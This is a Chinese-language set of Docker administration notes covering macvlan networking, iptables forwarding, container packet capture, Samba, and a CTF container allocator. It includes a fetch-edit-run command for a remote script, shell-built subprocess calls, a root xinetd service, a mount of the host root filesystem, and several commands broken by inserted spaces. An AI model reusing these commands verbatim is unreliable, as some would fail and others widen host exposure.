\uff0c\u518d\u7528nano\u6253\u5f00test.sql\uff0c\u7528Ctrl+W\u641c\u7d22https\uff08Google\u5173\u952e\u8bcd\u201dnano search\u201d\uff09\uff0c\u628a\u5bf9\u5e94\u7684\u5730\u65b9\u627e\u5230\u6539\u56dehttp\uff0c\u4fdd\u5b58\u540e\u7528 mysql -p\u5bc6\u7801 wordpress < test.sql \u5bfc\u5165\u6570\u636e\u5e93 \u5b8c\u4e8b~ Dockerfile \u4e2d\u7684 apt-get \u00b6 \u4e3a\u4e86\u8ba9 apt-get \u987a\u5229\u9759\u9ed8\u6267\u884c\uff0c\u9700\u8981\u914d\u7f6e\u73af\u5883\u53d8\u91cf\u9632\u6b62\u4ea4\u4e92\uff1a DEBIAN_FRONTEND=noninteractive apt-get install -y ... \u8ba9Docker\u5bb9\u5668\u5f97\u5230\u5185\u7f51IP \u00b6 \u8fd9\u91cc\u7684\u5185\u7f51\u4e0d\u662f\u53ea\u6709\u4e3b\u673a\u53ef\u4ee5\u8bbf\u95ee\u7684\u5bb9\u5668Docker\u5185\u7f51\uff0c\u800c\u662f\u4e3b\u673a\u63a5\u5165\u7684\u4f01\u4e1a\u5185\u7f51\u8fd9\u79cd\uff1b\u5982\u679c\u4f60\u80fd\u76f4\u63a5\u901a\u8fc7\u8bbe\u7f6eIP\u83b7\u5f97\u516c\u7f51IP\uff0c\u5f53\u7136\u6309\u7167\u8fd9\u4e2a\u65b9\u6cd5\u4e5f\u80fd\u7ed9\u5bb9\u5668\u5206\u914d\u516c\u7f51IP \u6ce8\u610f\uff1a\u6b64\u65b9\u6cd5Docker\u5bb9\u5668\u867d\u7136\u83b7\u5f97\u4e86\u548c\u4e3b\u673a\u5730\u4f4d\u76f8\u540c\u7684IP\uff0c\u4f46\u5bb9\u5668\u65e0\u6cd5\u4f7f\u7528\u4e3b\u673a\u7684IP\u4e0e\u4e3b\u673a\u901a\u8baf\uff0c\u4e3b\u673a\u597d\u50cf\u4e5f\u4e0d\u80fd\u8bbf\u95ee\u5bb9\u5668\u7684IP\uff0c\u8fd9\u662fLinux\u5185\u6838\u4e3a\u4e86\u9694\u79bb\u6027\u548c\u5b89\u5168\u6027\u505a\u51fa\u7684\u9650\u5236 \u53c2\u8003\uff1a \u4e0d\u7528\u7aef\u53e3\u8f6c\u53d1\u7ed9\u5bb9\u5668\u5206\u914d\u516c\u7f51IP\u5730\u5740 ASSIGN PUBLIC IP ADDRESS TO DOCKER CONTAINER WITHOUT PORT BINDING. Macvlan and IPvlan basics Docker Networking Tip \u2013 Macvlan driver PPT Docker Networking - Common Issues and Troubleshooting Techniques \u505a\u6cd5\u4e5f\u5f88\u7b80\u5355\uff0c\u9996\u5148\u521b\u5efa\u4e00\u4e2aMacvlan\u7c7b\u578b\u7684docker\u7f51\u7edc\uff0c\u7136\u540e\u5728\u521b\u5efa\u5bb9\u5668\u7684\u65f6\u5019\u52a0\u5165\u8fd9\u4e2a\u7f51\u7edc\u5e76\u6307\u5b9aIP/\u4e0d\u6307\u5b9a\u5219\u81ea\u52a8\u5206\u914d \u4f8b\u5b50\uff1a\u4e3b\u673a\uff08\u7f51\u5361eth0\uff09\u7684IP\u4e3a10.1.1.2\uff0c\u7f51\u5173\u4e3a10.1.1.1\uff0c\u4e3b\u673a\u6240\u5904\u7684IP\u6bb5\u662f10.1.1.1/24\uff0c\u5728\u8be5\u7f51\u6bb5\u5185\u4e3b\u673a\u53ef\u4ee5\u4efb\u610f\u83b7\u5f97IP\uff0c\u6211\u4eec\u5e0c\u671b\u5bb9\u5668\u5206\u914d\u572810.1.1.65~10.1.1.126\u4e4b\u95f4 \uff08\u5373 10.1.1.64/26\uff09 \u9644\uff1a \u8fd9\u662f\u4e00\u4e2a\u8f93\u5165Network 10.1.1.64/26\u8f6c\u6362\u4e3aHostMin 10.1.1.65~ HostMax 10.1.1.126\u7684\u8ba1\u7b97\u5668 docker network create - d macvlan - o macvlan_mode = bridge - o parent = eth0 --subnet=10.1.1.0/24 --ip-range=10.1.1.64/26 --gateway=10.1.1.1 macvlan_network docker run --net=macvlan_network --ip=10.1.1.100 -d nginx \u73b0\u5728\u4f60\u53ef\u4ee5\u8bbf\u95ee http://10.1.1.100 \u6765\u770b\u5230nginx\u7684\u6b22\u8fce\u9875\u9762\u4e86\uff0c\u4f60\u9700\u8981\u5728\u5185\u7f51\u53e6\u4e00\u53f0\u673a\u5668\u4e0a\u8bbf\u95ee\uff08\u6211\u7684\u53d1\u73b0\u662f\u4e3b\u673a\u548c\u8fd9\u6837\u5206\u914d\u7684\u5bb9\u5668\u662f\u4e0d\u4e92\u901a\u7684\uff09 \u53ef\u80fd\u7684IP\u51b2\u7a81 \u542f\u52a8\u5bb9\u5668\u65f6\u53ef\u4ee5\u4e0d\u6307\u5b9aip\u8ba9docker\u81ea\u52a8\u5206\u914d\uff0c\u8b66\u544a\uff1a\u5982\u679c\u6ca1\u6709\u914d\u7f6eip-range\u53c2\u6570\uff0c\u6709\u53ef\u80fd\u88ab\u5206\u914d\u7684\u6070\u597d\u662f\u4e3b\u673a\u672c\u8eab\u7684IP\uff0c\u8fd9\u79cd\u60c5\u51b5\u5c06\u5bfc\u81f4\u4e3b\u673a\u4e22\u5931IP\u65e0\u6cd5\u8054\u7f51\uff01 \u4e07\u4e00\u53d1\u751f\u8fd9\u79cd\u865a\u62df\u673a\u628a\u4e3b\u673a\u7684IP\u62a2\u5360\u7684\u60c5\u51b5\uff0c\u5728\u6ca1\u6709\u7269\u7406\u63a7\u5236\u65b9\u6cd5\u4e0b\u4e0d\u53ef\u8f7b\u6613\u4f7f\u7528ifconfig\u4fee\u6539\u4e3b\u673aIP\uff0c\u56e0\u4e3a\u4e00\u65e6\u4f7f\u7528ifconfig\u4e3b\u673a\u7684route\u5c06\u88ab\u6e05\u7a7a\u3001\u5f53\u524d\u4e3b\u673a\u7684\u5176\u4ed6IP\u4e5f\u4f1a\u4e22\u5931\uff0c\u4f60\u5c31\u4e22\u5931\u8fdc\u7a0b\u8bbf\u95ee\u7684\u53ef\u80fd\u4e86\uff08\u4e5f\u8bb8\u4f60\u53ef\u4ee5\u5199\u4e00\u4e2a\u811a\u672c\u81ea\u52a8\u6062\u590droute\u7a33\u59a5\u4e00\u70b9\uff09\uff1b\u4f46\u795e\u5947\u7684\u662f\u5373\u4f7f\u4e3b\u673aroute\u5df2\u7ecf\u4e22\u5931\uff0c\u6309\u7167\u4e0a\u8ff0macvlan\u5f00\u51fa\u6765\u7684Docker\u5bb9\u5668\u4ecd\u7136\u5728\u7ebf\uff08\u4e5f\u53ef\u4ee5\u7406\u89e3\u2014\u2014\u5bb9\u5668\u7684route\u5e76\u6ca1\u6709\u53d7\u5230\u5f71\u54cd\uff0c\u7c7b\u4f3c\u4e8eVirtualbox\u7684\u6865\u63a5\u7f51\u5361\u65b9\u5f0f\uff09 \u83b7\u53d6macvlan\u5bb9\u5668\u7684IP \u00b6 @TAG getip # clean version docker inspect --format \" {{ .NetworkSettings.Networks.macvlan\u7f51\u7edc\u540d\u79f0.IPAddress }} \" \u5bb9\u5668\u540d\u79f0 # dirty but quick version docker inspect \u5bb9\u5668\u540d\u79f0 | grep IP macvlan\u67e5\u770b\u5df2\u7ecf\u5206\u914d\u7684IP \u00b6 \u7531\u4e8e\u4e3b\u673a\u548c\u5bb9\u5668\u4e0d\u80fd\u4e92\u901a\uff0c\u6240\u4ee5\u4e3b\u673a\u5982\u4f55\u5f97\u77e5\u76ee\u524d\u5df2\u7ecf\u5206\u914d\u7684IP\u5217\u8868\u5462\uff1f\u7528docker network inspect\u54af\uff0c\u7136\u540e\u7528python\u5904\u7406\u4e00\u4e0b\u8f93\u51fa\u683c\u5f0f \u4e0b\u9762\u8fd9\u4e2a\u547d\u4ee4\u5217\u51fa\u4e86\u5bb9\u5668IP\u548c\u5bb9\u5668\u540d\u79f0\uff1a docker network inspect macvlan_bridge -- format \"{{range .Containers}}{{.IPv4Address}}@{{.Name}},,,{{end}}\" | python3 - c ' print ( input (). replace ( \"/24@\" , \" \\t \" ). replace ( \",,,\" , \" \\n \" ), end = \"\" ) ' | sort \u5982\u679c\u53ea\u9700\u8981IP\u5217\u8868\uff1a docker network inspect macvlan_bridge --format \" {{ range .Containers }}{{ .IPv4Address }} , {{ end }} \" | python3 -c 'print(input().replace(\"/24,\",\"\\n\"),end=\"\")'|sort \u4e3b\u673a\u8bbf\u95eemacvlan\u7684\u5bb9\u5668 \u00b6 \u7531\u4e8e\u5185\u6838\u9650\u5236\u5e76\u4e0d\u652f\u6301host\u76f4\u63a5\u4f7f\u7528\u4e0a\u8ff0\u6307\u5b9a\u7684ip\u8bbf\u95ee\u5bb9\u5668\uff0c\u800cdocker network connect\u8ba9\u5bb9\u5668\u518d\u52a0\u5165\u4e00\u4e2a\u7f51\u7edc\u53c8\u4f1a\u6539\u53d8\u5bb9\u5668\u7684\u9ed8\u8ba4\u8def\u7531\uff0c\u4f46\u6211\u5c31\u662f\u60f3\u8ba9\u4e3b\u673a\u80fd\u8bbf\u95ee\u5230\u5bb9\u5668\uff0c\u548b\u529e\u54e9\uff1f \u53c2\u8003\uff1ahttp://blog.oddbit.com/2018/03/12/using-docker-macvlan-networks/ \u60f3\u8bbf\u95ee\u7684\u5bb9\u5668IP\u4e3a10.1.1.66\uff0c\u8fd9\u79cd\u65b9\u6cd5\u9700\u8981\u8ba9\u4e3b\u673a\u518d\u83b7\u5f97\u4e00\u4e2aIP\uff0c\u4f8b\u598210.1.1.3\u3002\u6ce8\u610f\u8fd9\u79cd\u914d\u7f6e\u662f\u4e0d\u6301\u4e45\u7684\uff0c\u91cd\u542f\u540e\u4e22\u5931 DEVICE_NAME = \"eth0\" NAME = \"mynet-shim\" HOST_GETIP = \"10.1.1.3\" TARGET_IP = \"10.1.1.66\" ip link add $ NAME link $ DEVICE_NAME type macvlan mode bridge ip addr add $ HOST_GETIP / 32 dev $ NAME ip link set $ NAME up ip route add $ TARGET_IP / 32 dev $ NAME \u4f7f\u7528iptables\u7aef\u53e3\u8f6c\u53d1\u8ba9Docker\u5bb9\u5668\u5f97\u5230\u5185\u7f51IP \u00b6 \u4e0a\u8ff0\u57fa\u4e8emacvlan\u7684\u65b9\u6cd5\u5bb9\u5668\u65e0\u6cd5\u4e0e\u4e3b\u673a\u901a\u8baf\uff0c\u6240\u4ee5\u4e0b\u8ff0\u57fa\u4e8eiptables\u7aef\u53e3\u8f6c\u53d1\u7684\u65b9\u6cd5\u66f4\u80dc\u4e00\u7b79 \u8fd9\u79cd\u65b9\u6cd5\u57fa\u4e8e\u4e3b\u673a\u81ea\u5df1\u53bb\u83b7\u5f97\u4e00\u4e2a\u989d\u5916\u7684\u5185\u7f51ip\u540e\uff0c\u7528iptables\u7aef\u53e3\u8f6c\u53d1\u6765\u5b9e\u73b0\u7ed9\u5bb9\u5668\u5185\u7f51IP\u7684\u6548\u679c\uff0c\u5bb9\u5668\u5e94\u7528\u53ef\u4ee5\u5f97\u5230\u8bf7\u6c42\u6e90IP\uff0c\u4f46\u5bb9\u5668\u5411\u5916\u53d1\u8d77\u7684tcp\u8bf7\u6c42\u8fd8\u662f\u4e3b\u673a\u81ea\u8eab\u7684\u9ed8\u8ba4IP \u8be5\u811a\u672c\u8fd0\u884c\u65f6\u9700\u8981\u4e24\u4e2a\u53c2\u6570 \u7b2c\u4e00\u4e2a\u4e3a\u5bb9\u5668\u540d\u79f0 \u7b2c\u4e8c\u4e2a\u4e3a\u65b0\u7684IP\u540e\u7f00 \u4e3e\u4e2a\u4f8b\u5b50 \u4e3b\u673a\u572810.12.34.x\u8fd9\u4e2a\u5185\u7f51\u5730\u5740\u6bb5 \u4e14\u53ef\u4ee5\u968f\u610f\u5f97\u5230\u8fd9\u4e2a\u5730\u5740\u6bb5\u7684\u5185\u7f51IP\uff0c\u73b0\u5728\u8981\u7ed9mysql\u5bb9\u566810.12.34.202\u8fd9\u4e2aIP\uff0c\u8fd0\u884c\u65b9\u5f0f\u5c31\u662f ./give_container_ip.sh mysql 202 \u8bb0\u5f97\u4fee\u6539\u4e0b\u9762\u7684IPPREFIX\u548cETH0\u53d8\u91cf\uff01 give_container_ip.sh \u00b6 @TAG \u7aef\u53e3\u8f6c\u53d1 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 #!/bin/bash set -ex shopt -s expand_aliases if [ -z $1 ] && [ -z $2 ] ; then echo \"Usage: $0 <container name> <new IP suffix>\" echo \"Example: $0 u202 202\" exit 1 fi alias getip = \"docker inspect --format '{{.NetworkSettings.IPAddress}}' \" IPPREFIX = \"10.12.34.\" ETH0 = \"eth0\" sudo ifconfig $ETH0 : $2 $IPPREFIX$2 netmask 255 .255.255.0 up sudo iptables -t nat -I PREROUTING -d $IPPREFIX$2 -p tcp -j DNAT --to ` getip $1 ` sudo iptables -t nat -I POSTROUTING -s ` getip $1 ` /32 -d ` getip $1 ` /32 -p tcp -m tcp -j MASQUERADE \u4e3a\u4ec0\u4e48\u6700\u540e\u7528MASQUERADE\u800c\u4e0d\u7528SNAT\u5462\uff1f\u56e0\u4e3a\u7528SNAT\u5bb9\u5668\u7684\u5e94\u7528\u5c31\u4e0d\u80fd\u5f97\u5230\u8bf7\u6c42\u7684\u6e90IP\uff0c\u5728\u5b9e\u9645\u5e94\u7528\u4e2d\u662f\u65e0\u6cd5\u63a5\u53d7\u7684\uff1b\u8fd9\u4e00\u6761iptables\u89c4\u5219\u662f\u6211\u7528 docker run -p \u548c iptables-save \u5f97\u5230\u7684 \u5bf9\u5bb9\u5668\u7f51\u7edc\u6d41\u91cftcpdump \u00b6 Learned from: https://www.slideshare.net/SreenivasMakam/docker-networking-common-issues-and-troubleshooting-techniques docker run -ti --net container:<containerid> nicolaka/netshoot tcpdump -i eth0 -n port 80 \u4e3e\u4e2a\u4f8b\u5b50\uff0c\u4e0a\u8ff0\u542f\u52a8\u4e86nginx\u5bb9\u5668\u5e76\u5206\u914d\u4e86\u5185\u7f51ip 10.1.1.100\uff0c\u6211\u4eec\u6765\u6536\u96c680\u7aef\u53e3\u7684\u6d41\u91cf\uff0c\u5e76\u4fdd\u5b58\u5230/tmp/pcapfiles/nginx.pcap\u6587\u4ef6\uff1a docker run -ti --net container:f5fc -v /tmp/pcapfiles:/data nicolaka/netshoot tcpdump -i eth0 -n -s0 -w /data/nginx.pcap port 80 \u67e5\u770btcpdump\u53c2\u6570\u89e3\u91caexplainshell \u4fee\u6539\u6b63\u5728\u8fd0\u884c\u7684\u5bb9\u5668\u7684\u91cd\u542f\u7b56\u7565 \u00b6 docker run\u7684\u65f6\u5019\u5fd8\u4e86\u6307\u5b9arestart=always\uff0c\u9664\u4e86commit\u540e\u518d\u6b63\u786e\u5730run\u4e00\u904d\u4e4b\u5916\u6709\u6ca1\u6709\u66f4\u52a0\u4f18\u96c5\u7684\u4fee\u6539\u5bb9\u5668\u53c2\u6570\u7684\u65b9\u6cd5\u5462\uff1f \u53c2\u8003\uff1a https://stackoverflow.com/questions/26852321/docker-add-a-restart-policy-to-a-container-that-was-already-created \u57281.11\u7248\u672c\u540e\u6709\u4e86 docker update \u8fd9\u4e2a\u547d\u4ee4\uff0c\u53ef\u4ee5\u4fee\u6539\u6b63\u5728\u8fd0\u884c\u7684\u5bb9\u5668\u7684\u53c2\u6570\uff0c\u5982CPU\u9650\u5236\u3001\u5185\u5b58\u9650\u5236 \u548c \u91cd\u542f\u7b56\u7565 \u4f7f\u76ee\u524d\u8fd0\u884c\u7684\u6240\u6709\u5bb9\u5668\u90fd\u8bbe\u7f6e\u4e3a\u81ea\u52a8\u91cd\u542f\uff1a docker update --restart=always `docker ps -q` \u5982\u679c\u8981\u53d6\u6d88\u8fd9\u4e2a\u81ea\u52a8\u91cd\u542f\uff0c\u6539\u4e3a --restart=no \u5373\u53ef \u5feb\u901f\u90e8\u7f72samba \u00b6 @TAG share \u955c\u50cf\u5730\u5740\uff1a dperson/samba \u5feb\u901f\u5206\u4eab\u4e00\u4e2a\u76ee\u5f55/data\uff0c\u7528\u6237\u540d user \u5bc6\u7801 badpassword \uff1a docker run -d -p 139:139 -p 445:445 --name samba -v /data:/data dperson/samba -u \"user;badpassword\" -s \"data;/data;yes;no;no;all\" \u5176\u4e2d-u\u6307\u5b9a\u7528\u6237\u540d\u5bc6\u7801\uff1b-s\u53c2\u6570\u7684\u683c\u5f0f\u4e3a\uff1a \u7ed9\u8bbf\u95ee\u8005\u770b\u7684\u5206\u4eab\u540d\u79f0;\u7269\u7406\u4f4d\u7f6e;\u662f\u5426\u5217\u51fa;\u672a\u767b\u5f55\u53ef\u5426\u8bbf\u95ee;\u5141\u8bb8\u8bbf\u95ee\u7684\u7528\u6237(all\u8868\u793a\u6240\u6709\u7528\u6237) \u6309\u9700\u5206\u914d\u5bb9\u5668 \u8fc7\u671f\u81ea\u52a8\u9500\u6bc1 \u00b6 @TAG ctf xinetd \u6709\u4e9b\u9898\u76ee\u9700\u8981\u7ed9\u6bcf\u4e2a\u4eba\u5355\u72ec\u7684\u5bb9\u5668\uff0c\u4e3a\u4e86\u8282\u7ea6\u8d44\u6e90\u8fd8\u9700\u8981\u8bbe\u7f6e\u4e00\u4e2a\u65f6\u95f4\uff0c\u8fc7\u671f\u540e\u81ea\u52a8\u5220\u9664\u5bb9\u5668 \u4e3a\u4e86\u9632\u6b62\u6ee5\u7528\u8fd8\u8981\u5f15\u5165Proof Of Work\uff0c\u56de\u7b54\u6b63\u786e\u540e\u624d\u5206\u914d\u5bb9\u5668 Warning \u8be5\u4ee3\u7801\u76f4\u63a5\u7528\u7684docker\u547d\u4ee4\u6765\u521b\u5efa\u5bb9\u5668\uff0c\u4e14\u9700\u8981root\u6743\u9650\uff0c\u6ce8\u610f\u4f7f\u7528\u4e0a\u7684\u5b89\u5168\u98ce\u9669 \u4ee3\u7801\u5982\u4e0b\uff1a utils.py #/usr/bin/python3 #coding:utf-8 import subprocess import time import string import os import hashlib import random from random import randint # \u9650\u65f6\u8bbe\u5b9a def clock ( timeout = 5 ): import signal def signal_handler ( signum , data ): if signum == signal . SIGALRM : print ( \"Time is up!\" ) exit () signal . signal ( signal . SIGALRM , signal_handler ) signal . alarm ( int ( timeout )) # \u751f\u6210\u968f\u673a\u5b57\u7b26\u4e32 def randomstring ( len = 5 ): return '' . join ( random . sample ( string . ascii_letters , len )) # \u8ba1\u7b97md5 def md5 ( src ): return hashlib . md5 ( bytes ( src , encoding = 'utf-8' )) . hexdigest () # \u663e\u793a\u4e00\u4e2a\u968f\u673a\u5b57\u7b26\u4e32\uff0c\u8981\u6c42\u7528\u6237\u8ba1\u7b97\u5176md5 def pow_calcmd5 (): question = randomstring () answer = md5 ( question ) print ( \"Please calculate md5( %s )=\" % question , end = '' ) if input () != answer : exit () # \u663e\u793a\u4e00\u4e2a\u968f\u673a\u5b57\u7b26\u4e32\uff0c\u8981\u6c42\u7528\u6237\u8f93\u5165\u53e6\u4e00\u4e2a\u5b57\u7b26\u4e32\u6ee1\u8db3md5\u4ee5difficulty\u4e2a0\u5f00\u5934 def pow_realmd5 ( difficulty = 4 ): question = randomstring () print ( \"[Proof Of Work]\" ) print ( \"Please calculate s, make that \\n md5( \\\" %s \\\" +s).startswith(' %s ')\" % ( question , '0' * difficulty )) print ( \"Input your s:\" , end = '' ) s = input () if not md5 ( question + s ) . startswith ( '0' * difficulty ): exit () # \u4ece\u955c\u50cf\u542f\u52a8\u5bb9\u5668 def start_container ( image , port , paramstring ): \"\"\" image:\u955c\u50cf\u540d\u79f0 port: \u9700\u8981\u6620\u5c04\u7684\u7aef\u53e3 paramstring: \u989d\u5916\u7684\u53c2\u6570\u8bbe\u7f6e\u5b57\u7b26\u4e32 \u5982\"-v /d/blabla:/data\" \u8fd4\u56de(\u5bb9\u5668ID, \u6620\u5c04\u5f97\u5230\u7684\u7aef\u53e3) \"\"\" container = subprocess . check_output ( \"docker run -d -p :\" + str ( port ) + \" \" + paramstring + \" \" + image + \" /run.sh\" , shell = True ) . decode () . replace ( \" \\n \" , \"\" ) inspect = subprocess . check_output ( \"docker inspect --format '{{.NetworkSettings.Ports}}' %s \" % container , shell = True ) . decode () . replace ( \" \\n \" , \"\" ) openport = inspect . split ( \"{\" )[ 1 ] . split ()[ 1 ] . split ( \"}\" )[ 0 ] return ( container , openport ) # \u8ba1\u5212\u5728minutes\u5206\u949f\u540e\u9500\u6bc1\u5bb9\u5668container \u9700\u8981atd\u670d\u52a1 def plan_stop_container ( container , minutes ): PATH = os . getcwd () minutes = str ( minutes ) filename = \" %s _ %d \" % ( time . strftime ( \"%Y_%m_ %d _%H_%M_%S\" ), randint ( 0 , 666 )) open ( PATH + \"/\" + filename , \"w\" ) . write ( \"docker kill %s && docker rm %s && rm %s / %s \" % ( container , container , PATH , filename )) subprocess . check_output ( \"at now + %s minutes -f %s 2>/dev/null\" % ( minutes , filename ), shell = True ) # \u751f\u6210\u4e00\u4e2arunner\u7684\u4e8c\u8fdb\u5236\u7a0b\u5e8f\uff0cxinetd\u5e76\u4e0d\u652f\u6301\u76f4\u63a5\u8fd0\u884cpython if __name__ == \"__main__\" : print ( \"[*] writing to runner.c\" ) path = os . getcwd () open ( \"runner.c\" , \"w\" ) . write ( \"\"\"#include <stdio.h> #include <stdlib.h> #include <unistd.h> int main(){ chdir(\" %s \"); system(\"python3 %s /runner.py\"); return 0; } \"\"\" % ( path , path )) print ( \"[*] compile runner.c to runner\" ) os . system ( \"gcc runner.c -o runner\" ) \u7528\u5230\u7684xinetd\u914d\u7f6e\uff1a runner.conf \uff0c\u6ce8\u610f\u4fdd\u5b58\u7684\u65f6\u5019\u4e0d\u80fd\u6709\\r :set ff=unix service \u9898\u76ee\u540d\u79f0 { socket_type = stream protocol = tcp wait = no user = root bind = 0.0.0.0 server = /\u7edd\u5bf9\u8def\u5f84/runner type = UNLISTED port = \u7aef\u53e3\u53f7 disable = no } \u5728\u5bb9\u5668A\u4e2d\u4f7f\u7528\u522b\u540d\u8bbf\u95ee\u5bb9\u5668B \u00b6 \u5bb9\u5668A\u662fweb\u5e94\u7528\uff0c\u9700\u8981\u8bbf\u95eeredis\u7684\u5bb9\u5668B\uff0c\u5982\u679c\u7528docker inspect\u62ff\u5230\u73b0\u5728\u5bb9\u5668B\u7684IP\u5199\u5165\u5230\u914d\u7f6e\uff0c\u4e00\u65e6docker\u91cd\u542f\u8fd9\u4e2a\u5bb9\u5668IP\u5c31\u4f1a\u53d1\u751f\u53d8\u5316 \u66f4\u597d\u7684\u65b9\u5f0f\u662f\u4f7f\u7528docker\u7684\u81ea\u5b9a\u4e49\u7f51\u7edc\uff1a\u521b\u5efa\u7f51\u7edc\uff0c\u628aredis\u52a0\u5165\u7f51\u7edc\uff0c\u628aapp\u52a0\u5165\u7f51\u7edc docker network create useredis docker network connect --alias redis useredis redis docker network connect --alias app useredis app \u5728\u52a0\u5165\u7f51\u7edc\u7684\u65f6\u5019\u6307\u5b9a\u2013alias\u5373\u53ef\uff0c\u7f51\u7edc\u4e2d\u7684\u5176\u4ed6\u5bb9\u5668\u5c31\u80fd\u901a\u8fc7\u8fd9\u4e2aalias\u8bbf\u95ee\u5230\uff0c\u8fd9\u6837\u64cd\u4f5c\u540eapp\u5bb9\u5668\u91cc\u9762\u5c31\u80fdping redis\u4e86 \u4fee\u590dDocker\u66f4\u65b0\u523018.02\u540e\u90e8\u5206\u5bb9\u5668\u65e0\u6cd5start\u7684\u95ee\u9898 \u00b6 apt\u8bf4\u53ef\u4ee5\u66f4\u65b0\uff0c\u4e8e\u662f\u5c31\u66f4\u65b0\u4e86\uff0c\u7136\u800c\u5374\u60b2\u50ac\u5730\u53d1\u73b0\u90e8\u5206\u5bb9\u5668\u65e0\u6cd5\u542f\u52a8\uff0c\u62a5\u9519\u4fe1\u606f\uff1a docker start <container_name> returns \"container <hash> already exists\" Google\u627e\u5230\u4e86\u76f8\u5173issue\u5728 \u8fd9\u91cc \u4e0d\u5220\u5bb9\u5668\u91cd\u5efa\u3001\u4e0d\u56de\u6edaDocker\u7684\u89e3\u51b3\u65b9\u6848\u4e3a\uff1a sudo docker-containerd-ctr --namespace moby --address /run/docker/containerd/docker-containerd.sock c rm `docker inspect --format ' {{ .Id }} ' \u65e0\u6cd5\u542f\u52a8\u7684\u5bb9\u5668\u540d\u79f0` \u6ce8\u610f\u9700\u8981\u8f93\u5165\u7684\u662f\u90a3\u4e2a\u5f88\u957f\u7684\u5bb9\u5668id\uff0c\u6240\u4ee5\u5148\u7528docker inspect\u83b7\u53d6\u5176\u957fId \u5982\u679cdocker-containerd-ctr \u4e0d\u5b58\u5728\uff0c\u4e5f\u8bb8\u4f60\u4f7f\u7528\u7684\u662fDocker for mac\uff0c\u9700\u8981\u8fd9\u4e48\u64cd\u4f5c\uff1a docker run -it --rm -v /:/host alpine /host/usr/local/bin/docker-containerd-ctr --namespace moby --address /host/run/docker/containerd/docker-containerd.sock c rm \u51fa\u9519\u7684\u5bb9\u5668id \u89e3\u51b3docker exec -it\u8fdb\u5165\u5bb9\u5668\u5c4f\u5e55\u5927\u5c0f\u4e0d\u5bf9\u7684\u95ee\u9898 \u00b6 \u53d1\u73b0docker exec -it\u8fdb\u5165\u5bb9\u5668\u7684bash\u540etty\u7684\u5927\u5c0f\u4e0d\u5bf9 \u53ea\u670980x24\uff0c\u53c2\u8003\u8fd9\u4e2a https://github.com/moby/moby/issues/35407 \u89e3\u51b3\u65b9\u6848\uff1a\u5728\u8fdb\u5165\u5bb9\u5668\u65f6\u914d\u7f6e\u73af\u5883\u53d8\u91cfCOLUMNS\u548cLINES\u4e3a\u6b63\u786e\u503c\u5373\u53ef\uff0c\u4e3a\u4e86\u4fbf\u4e8e\u64cd\u4f5c\u4e0e\u8bb0\u5fc6\uff0c\u5199~/.bashrc\u54af\uff1a function din(){ docker exec -ti --env COLUMNS=`tput cols` --env LINES=`tput lines` $1 /bin/bash } alias din=din \u4f7f\u7528\u7684\u65f6\u5019\u53ea\u9700\u8981 din \u5bb9\u5668\u540d\u79f0 \u5c31\u80fd\u8fdb\u5165\u5bb9\u5668bash\u5566\uff0c\u8fd9\u6837\u8fdb\u5165\u5bb9\u5668vim\u4e5f\u80fd\u5168\u5c4f\u5e55\u663e\u793a\u4e86 \u4e0d\u4f7f\u7528docker pull\u4e5f\u80fd\u4e0b\u8f7d\u5230\u955c\u50cf \u00b6 \u8be5\u811a\u672c\u5b58\u5728\u95ee\u9898\uff0c\u4e0b\u8f7d\u5230\u7684\u955c\u50cf\u5c42\u53ef\u80fd\u65e0\u6cd5\u5bfc\u5165\uff0c\u4ecd\u5f85\u7814\u7a76 github\u4e0a\u5b98\u65b9\u6709\u4e0b\u8f7d\u811a\u672c\uff1a https://github.com/moby/moby/blob/master/contrib/download-frozen-image-v2.sh \u4f7f\u7528\u7684\u65f6\u5019\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u76ee\u5f55\u540d\u79f0\uff0c\u7b2c\u4e8c\u4e2a\u662f\u955c\u50cf\u540d\u79f0:latest\uff0c\u5176\u4e2d:tag\u662f\u5fc5\u987b\u8981\u5199\u7684 \u4e0b\u8ff0\u547d\u4ee4\u4e0b\u8f7d\u811a\u672c\uff0c\u66ff\u6362\u4e3a\u4ece\u963f\u91cc\u4e91\u4e0b\u8f7d\uff0c\u6700\u540e\u6253\u5305\u6210golang.tar \uff08\u7531\u4e8e\u4e0b\u8f7d\u5230\u7684layer\u7684tar\u5305\u5df2\u7ecf\u662fgzip\u538b\u7f29\u8fc7\u7684 \u6ca1\u5fc5\u8981\u518d7zip\u538b\u7f29\uff09 wget https : // raw . githubusercontent . com / moby / moby / master / contrib / download - frozen - image - v2 . sh sed - i 's/registry-1.docker.io/h0kyslzs.mirror.aliyuncs.com/g' download - frozen - image - v2 . sh sed - i 's/token=\"$(/token=\"\" #/g' download - frozen - image - v2 . sh chmod + x download - frozen - image - v2 . sh ./ download - frozen - image - v2 . sh / tmp / golang google / golang : latest tar - vf golang . tar - cC '/tmp/golang' . \u7136\u540e\u5c31\u53ef\u4ee5\u4f20\u8f93golang.tar\uff0c\u5bfc\u5165\u65b9\u6cd5\u5f88\u7b80\u5355 docker load < golang . tar \u542f\u52a8\u53e6\u4e00\u4e2aDocker Daemon\u8fdb\u7a0b \u00b6 \u6709\u65f6\u5019\u9700\u8981\u8fdb\u884cbuild\u64cd\u4f5c\uff0c\u53d1\u73b0\u6839\u76ee\u5f55\u5269\u4f59\u7a7a\u95f4\u4e0d\u591f\u4e86\uff0c\u4f46\u53e6\u5916\u4e00\u5757\u786c\u76d8\u8fd8\u6709\u7a7a\u95f4\uff0c\u6574\u4f53\u8fc1\u79fb/var/lib/docker\u6216\u5408\u5e76\u4e24\u4e2a\u786c\u76d8\u4e3alvm\u53c8\u4e0d\u73b0\u5b9e\uff0c\u8fd9\u65f6\u5c31\u53ef\u4ee5\u5f00\u542f\u4e00\u4e2a\u65b0\u7684Docker Daemon\uff0c\u628aDocker\u4f7f\u7528\u7684\u76ee\u5f55\u8bbe\u7f6e\u4e3a\u53e6\u4e00\u5757\u786c\u76d8 \u53c2\u8003\uff1ahttp://blog.alpaca.ai/run-multiple-docker-daemons-with-net-container/ docker\u5de5\u4f5c\u76ee\u5f55\u5047\u8bbe\u4e3a/home/cy/docker \u7b2c\u4e00\u6b21\u6267\u884c\uff1a OFFSET=0 u=\"cy\" BRIDGE_NAME=br_ ${ u } DOCKER_ROOT=/home/ ${ u } /docker mkdir -p ${ DOCKER_ROOT } brctl addbr ${ BRIDGE_NAME } SUBNET=$(expr 52 + ${ OFFSET } ) ip addr add 172.18. ${ SUBNET } .1/24 dev ${ BRIDGE_NAME } ip link set dev ${ BRIDGE_NAME } up iptables -t nat -A 